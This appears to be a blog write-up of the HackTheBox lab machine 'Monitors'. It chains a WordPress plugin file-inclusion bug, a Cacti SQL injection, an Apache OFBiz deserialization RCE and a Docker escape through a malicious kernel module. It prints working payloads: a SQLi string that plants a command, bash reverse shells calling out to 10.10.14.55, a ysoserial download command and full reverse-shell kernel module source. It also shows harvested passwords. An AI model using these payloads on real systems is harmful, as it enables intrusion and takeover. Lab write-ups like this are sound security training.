---
title: HackTheBox Monitors
date: 2021-10-31
categories: [CTF, hackthebox]
tags: [htb, hackthebox, ctf, nmap, apache, ofbiz, '8443', deepce, rfi, wordpress, cap_sys_module, capability, linux, cve, '2020-9496', xml, java, xmlrpc, rpc, sql, solr ]     # TAG names should always be lowercase

image:
  src: /image/hackthebox/monitors/monitorsinfocard.png
  width: 1000   # in pixels
  height: 400   # in pixels
  alt: monitorsinfocard
---


# Machine Information
Monitors is a hard difficulty machine that starts with a vulnerable RFI plugin on a WordPress site. I acquire information on different vHosts hosting vulnerable cactus after some enumeration, which leads to code execution through SQL command. From there, I went to user and discovered a docker container running the vulnerable Apache OFbiz, which I exploited by installing a malicious kernel module and gaining root access to the host.

# Enumeration

## Nmap

`nmap` is a is a network scanner. With feeding this an IP you can scan for its open ports and services running on it. This tool is exalted for its positive results in the InfoSec community.

Lets start using it,
`sudo nmap -p- -oA nmap/all 10.10.10.238 --min-rate=10000`
Here,
`-p-` : Specifies All ports 0-65535
`-oA` : To print output into files with extensions gnmap,xml,nmap, Here A stands for All.
`--min-rate=` : When the --min-rate option is given Nmap will do its best to send packets as fast as or faster than the given rate.
And I got the following result,

``` bash
Nmap scan report for 10.10.10.238
Host is up (0.31s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 307.22 seconds
```
Now I scan them to identify running services and nmap pre-installed scripts using `-sV` and `-sC` flags respectively.
``` bash
Nmap scan report for 10.10.10.238
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e (RSA)
|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 (ECDSA)
|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn\'t have a title (text/html; charset=iso-8859-1).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.21 seconds
```
So there are only 2 ports are open,
1. `22 - ssh`     : OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
2. `80 - http`  :	Apache httpd 2.4.29

After googling these version the potential host is Ubuntu 18.04 Bionic. Not that it matters for now!

# Visiting Port 80
The web page looks like this,

![image-20211019200541538](/image/hackthebox/monitors/image-20211019200541538.png)

Since it is saying monitors.htb, I added it to the host file `/etc/hosts`
> 10.10.10.238    monitors.htb

I started to look for any esoteric VHosts using `ffuf`,  Fuzz Faster U Fool (ffuf) is a Fuzzer written in GO language [read it here](https://github.com/ffuf/ffuf), by following command:
`ffuf -u http://monitors.htb -w /opt/Tools/SecLists/Discovery/Web-Content/raft-small-words.txt -H "Host: FUZZ.monitors.htb" -fl 1`

Here,
1. `-u` : refers to URL to scan
2. `-w` : Wordlist containing some spicy words
3.  `-H` : To edit and send header to scan Hosts with FUZZ keyword
4.  `-fl` : Refers to Filter Line   

This is how the site looks after adding hostname to host file.

![image-20211019200617529](/image/hackthebox/monitors/image-20211019200617529.png)

At the bottom, It is saying Wordpress. So I ran `wpscan` against the website, with following flags:
`wpscan --url http://monitors.htb/ -e ap --detection-mode aggressive -v`

1. `--url` : URL to scan
2. `-e ap` : This will enumerate all plugins that are used in the site.
3. `--detection-mode aggressive` : Will scan for information more aggressively.
4. `-v` : This will print verbosely

The tool has given quite an information but interesting is the `wp-with-spritz` plugin.

![image-20211019200641285](/image/hackthebox/monitors/image-20211019200641285.png)

## RFI on Plugin
So, The plugin is vulnerable to RFI. I search for this plugin under `searchsploit` it gave me `44544.php` this file explaining the Proof of Concept for this exploit.

> if(isset(\$_GET\['url'])){
> \$content=file_get_contents($_GET\['url']);

Above code is present inside the plugin file, and POC explains to ways to extract information,

> 1. /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../..//etc/passwd
> 2. /wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http(s)://domain/exec

I tried first and successfully got `/etc/passwd` file, I also tried to extract `.ssh/id_rsa` from user's home directory but server only replied with empty page. At this point I am Assuming user did not have ssh login configured for himself or some permission is blocking the contents.

![image-20211019200709983](/image/hackthebox/monitors/image-20211019200709983.png)

I looked at the `/etc/apache2/sites-enabled/000-default.conf` and it showed two config files on on respective VHosts, there is one VHost that was hiding in the dark.
1.  monitors.htb.conf
2.  cacti-admin.monitors.htb.conf


![image-20211019200758003](/image/hackthebox/monitors/image-20211019200758003.png)

I added it to a host file.
> 10.10.10.238    monitors.htb cacti-admin.monitors.htb cacti

And visited the site. Below is the face of it. 

![image-20211019200858965](/image/hackthebox/monitors/image-20211019200858965.png)

I tried the dictionary attack against it, but none of it gave fructive result. So I started to enumerate for credentials.
This time I hunt for wordpress config file residing in `/var/www/wordpress/wp-config.php`, and I get username as well as password.

![image-20211019200936155](/image/hackthebox/monitors/image-20211019200936155.png)



I used those `wpadmin:BestAdministrator@2020!` credentials to login onto the portal, after just changing `wpadmin` to `admin` I was successfull in logging in.

![image-20211019201010605](/image/hackthebox/monitors/image-20211019201010605.png)

Above image shows post logging-in page with `Version 1.2.12` indicated on the top right side, `searchsploit` shows this version is exploitable to `'filter' SQL Injection / Remote Code Execution`. Refering the `49810.py` for POC, It says that `/cacti/color.php?action=export&header=false&filter=1` is vulnerable, but you have to visit `/cacti/host.php?action=reindex` to trigger the payload.
The Payload is used in 3 chunks 
`')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='{rshell};'+where+name='path_php_binary';--+-`

Using first chunk I am able to get credentials of users, 

![image-20211019201039188](/image/hackthebox/monitors/image-20211019201039188.png)

Which means exploit Indeed this works in this machine but before doing that lets ping to our machine.
So, the payload for ping is 
`')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='ping+-n+2+10.10.14.31;'+where+name='path_php_binary';--+-`

As you can see we get a ping back.

![image-20211019201106535](/image/hackthebox/monitors/image-20211019201106535.png)

Now, lets try to get reverse shell. But I was getting nothing back this time. Not sure what happened so I reboot the box and sent the payload again,this time I get reverse shell as `www-data` user.

![image-20211019201133153](/image/hackthebox/monitors/image-20211019201133153.png)

Now let's get proper shell with `python3` as follows:

![image-20211019201158049](/image/hackthebox/monitors/image-20211019201158049.png)

So there was `/usr/share/cacti/cacti/include/config.php` files in which some credentials was store, I used them to login into mysql service but my request was declined.
>ERROR 1045 (28000): Access denied for user 'cacti'@'localhost' (using password: YES)

I started to poke around the machine to see any handy information leading to anywhere. In `/home/marcus/` directory, `.backup/` and `notes.txt` was throwing `Permission denied` errors. Now exploiring again and I find interesting service running inside `/etc/systemd/system/` and we as a user can read this file.
> lrwxrwxrwx  1 root root   40 Nov 10  2020 cacti-backup.service -> /lib/systemd/system/cacti-backup.service

Here `l` in `lrwxrwxrwx` defines symbolic link.
Inside the file:
>[Unit]\
>Description=Cacti Backup Service\
>After=network.target\
>[Service]\
>Type=oneshot\
>User=www-data\
>ExecStart=/home/marcus/.backup/backup.sh\
>[Install]\
>WantedBy=multi-user.target\

I can read `/home/marcus/.backup/backup.sh` file since it is owned by `www-data` user.

Inside `backup.sh` file:

>#!/bin/bash\
>backup_name="cacti_backup"\
>config_pass="VerticalEdge2020"\
>zip /tmp/\${backup_name}.zip /usr/share/cacti/cacti/*\
>sshpass -p "\${config_pass}" scp /tmp/\${backup_name} 192.168.1.14:/opt/backup_collection/\${backup_name}.zip\
>rm /tmp/\${backup_name}.zip\

I tried logging in with our `python3` shell from `su marcus -` command but it was giving error. So, I logged in through SSH.

![image-20211019201228004](/image/hackthebox/monitors/image-20211019201228004.png)

There is a `note.txt` file residing in user's home directory and it is a TO-DO list to update docker image file which is unchecked. It hints that I might be inside docker container or I have to enumerate more on how container.
>marcus@monitors:~$ cat note.txt 
>TODO:\
>\
>Disable phpinfo in php.ini              - DONE\
>Update docker image for production use  - 

I ran `deepce.sh`, it says that we are not inside container. Also there is not `/.docker/` directory inside root directory. So, It's time to get more infomation about this machine.

![image-20211019201248798](/image/hackthebox/monitors/image-20211019201248798.png)

I looked for any local port listening and there are two `8443` and `3306` ports listening. 
1. `8443` - I have no clue on what service this port is using.
2. `3306` - Usually, MySql uses this port.

![image-20211019201337309](/image/hackthebox/monitors/image-20211019201337309.png)

I tried logging in using `marcus` credentials on `mysql` service but I get access denied.

# Port 8443

Since the machine does not have `wget` or `curl` I can not directly interact with the port. I have to use SSH port forwarding to access the port. To forward port on just type `~C` on fresh terminal.
>marcus@monitors:~$ \
>ssh> -L 8443:127.0.0.1:8443\
>Forwarding port.

1. `-L` - So any traffic hitting my 8443 port will be forwarded to Monitor's 8443 port. `myport:destination:port-to-forward`

Visiting the page it says TLS is required, Now we jump from `http` to `https`.

![image-20211019201400007](/image/hackthebox/monitors/image-20211019201400007.png)

I have started `ffuf` to look for any exclusive directory that will lead me closer to knowing service and I get `myportal` directory.

![image-20211019201422940](/image/hackthebox/monitors/image-20211019201422940.png)

I visted the path which redirected me to login portal, At the bottom you can see it is `Apache OFbiz v17.12.01`.

![image-20211019201446105](/image/hackthebox/monitors/image-20211019201446105.png)

Running this version under `searchploit` provided `ApacheOfBiz 17.12.01 - Remote Command Execution (RCE) via Unsafe Deserialization of XMLRPC arguments` exploit.

# Apache OFbiz

The vulnerabilty explainaion from [Zero Day Initiative](https://www.zerodayinitiative.com/blog/2020/9/14/cve-2020-9496-rce-in-apache-ofbiz-xmlrpc-via-deserialization-of-untrusted-data) says the vulnerability arrises due to Java serialization issues when processing requests sent to `/webtools/control/xmlrpc`. A remote unauthenticated attacker can exploit this vulnerability by sending a crafted request. Successful exploitation would result in arbitrary code execution.

Visiting `https://localhost:8443/webtools/control/xmlrpc` site throws an error.

![image-20211019204324255](/image/hackthebox/monitors/image-20211019204324255.png)



I googled for Apache OFbiz exploit POC 2020-9496 and a bunch of results came. Since they are all same methods on getting a revese shell, I chose for g33xter's POC. you can follow it on his github profile, [click here](https://github.com/g33xter/CVE-2020-9496).

POC to getting root:

1.  First I have created a bash reverse shell file calling it shell.sh .

   ```bash
   #!/bin/bash
   /bin/bash -i >& /dev/tcp/10.10.14.55/9001 0>&1
   ```

2.  Then I downloaded ysoserial.jar file from official repository. you have [click here](https://github.com/frohoff/ysoserial) to visit their page.

3.  Now I will generate payload to download shell.sh. It will give out very long base64 encoded payload.

   ```bash
   java -jar ysoserial.jar CommonsBeanutils1 "wget 10.10.14.55/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"
   ```

4.  I will start my python3 server where my shell.sh file is residing.

   ```bash
   python3 -m http.server
   ```

5.  Then I sent the payload from BurpSuite using provided code from repository.

   ![image-20211020203220361](/image/hackthebox/monitors/image-20211020203220361.png)

6.  It hit my python server and got the file successfully.

   ![image-20211020203245620](/image/hackthebox/monitors/image-20211020203245620.png)

7.  Now I will create new payload to execute bash file downloaded in `/tmp/shell.sh` directory. Sent the payload again from burpsuite.

8.  As you can see I successfully got my reverseshell.

   ![image-20211020203354437](/image/hackthebox/monitors/image-20211020203354437.png)

   Looking at the hostname, I am certainly inside a docker, and I have to find a way to get out it. 

This time again after running `deepce.sh`, it returned two highlighted capabilities and showed two files inside root directory.

![image-20211021132959675](/image/hackthebox/monitors/image-20211021132959675.png)

Files are kernel modules;

```bash
[+] Interesting files in root ........... Yes                                                      
/linux-headers-4.15.0-132_4.15.0-132.136_all.deb                                                                               
/linux-headers-4.15.0-132-generic_4.15.0-132.136_amd64.deb 
```

This looks like potential path to exploit.

I will first go with `cap_sys_module`. For this exploit I refered to this blog from [Pentester's Academy](https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd). It showed I need to make two different files `shell.c` and `Makefile`.

1. I will just copy the source code and replace IP address to mine naming it `shell.c` .

```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");
char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.55/9001 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };
static int __init reverse_shell_init(void) {
	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}
static void __exit reverse_shell_exit(void) {
	printk(KERN_INFO "Exiting\n");
}
module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

2. Then create a `Makefile`.

```makefile
obj-m +=shell.o
all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Now that I have both files under one directory.

3. Its time to just type `make` . This will compile `shell.c` file and breed lots of files.

![image-20211021143856916](/image/hackthebox/monitors/image-20211021143856916.png)

4. Now I just have to insert our malicious kernel module inside in machine, using `insmod shell.ko` and I get reverse shell on my netcat listener.

![image-20211021143809034](/image/hackthebox/monitors/image-20211021143809034.png)

